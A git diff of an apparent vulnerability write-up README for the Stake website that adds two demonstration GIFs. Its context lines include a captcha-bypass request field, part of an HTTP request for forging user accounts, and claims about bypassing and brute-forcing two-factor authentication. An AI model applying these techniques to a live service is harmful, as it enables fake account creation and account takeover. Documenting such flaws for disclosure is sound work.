@@ -11,6 +11,10 @@ After finding a number of vulnerabilities on the Stake website, without any intr
 Bypassing Captcha:
 Simply append the `"captcha":"captchaIgnore"` option in any request body.
 
+<p align="center">
+  <img width="800" height="400" src="https://github.com/dragoneyeintel/StakeOver/raw/main/CreateUsersUnderEmailSkipCaptcha.gif">
+</p>
+
 Forging Users:
 ```
 POST /api/users/createuser/ HTTP/2
@@ -36,6 +40,10 @@ Accept-Language: en-US,en;q=0.9
 ```
 
 The user verification link will be sent to the email not the username although the website will prompt "Sending to username". This is not a problem however as 2FA can be bypassed.
+
+<p align="center">
+  <img width="800" height="400" src="https://github.com/dragoneyeintel/StakeOver/raw/main/Bypass2FA.gif">
+</p>
 
 Two-Factor Authentication Bruteforce:
 ```
